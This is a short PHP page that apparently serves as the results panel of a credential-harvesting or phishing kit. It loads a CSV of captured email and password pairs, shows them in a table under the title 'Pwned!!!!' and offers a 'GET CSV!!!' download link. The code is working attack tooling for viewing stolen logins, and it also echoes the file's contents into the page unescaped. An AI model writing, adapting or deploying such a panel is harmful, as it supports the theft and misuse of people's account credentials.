			<?php 


				$file_handler=fopen("c0egand1G7.csv","r");

				$data= fgetcsv($file_handler,1000,";");

				while (($data = fgetcsv($file_handler, 1000, ";")) !== FALSE) {
					
					$matriz[]=$data;


				}

				//echo '<pre>'; print_r($matriz); echo '</pre>';

				fclose($file_handler);


			?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style type="text/css">
		*{
			margin: 0;
			padding: 0;
		}
		header{
			background: #000;
			color: whitesmoke;
			padding: 50px;
			margin-bottom: 15px;
			text-align: center;
		}
		table{
			text-align: center;
			margin: 0 auto;
			width: 50%;
			border-collapse: collapse;
		}
		table,td{
			border: 1px solid black;
		}
		th{
			border-left: 1px solid white;
			color:  white;
			background: #000;
			height: 50px;

		}
		button{
			background: #000;
			border: 1px solid black;
			padding: 10px 30px 10px 30px;
			border-radius: 5px;
			display: block;
			margin: 30px auto;
		}
		button, a{
			text-align: center;
			text-decoration: none;
			color: white;
			font-size: 20px;
		}


	</style>
	<title>Pwned!!!!</title>
</head>
<body>
	<header><h1>GANGSHIT</h1></header>
	<table>
		
		<thead>
			<tr>
				
				<th>EMAIL</th>
				<th>PASSWORD</th>

			</tr>
		</thead>

		<?php 

		$s='<tbody class="table_body">';
			
		foreach ($matriz as $i){
					
			$s .='<tr>';

				foreach($i as $j){


					$s .= '<td>' . $j . '</td>'; 

				}

			$s.='</tr>';

		}

		$s.='</tbody>';

		echo $s;

		?>


	</table>


	<button><a href="./c0egand1G7.csv">GET CSV!!!</a></button>
</body>
</html>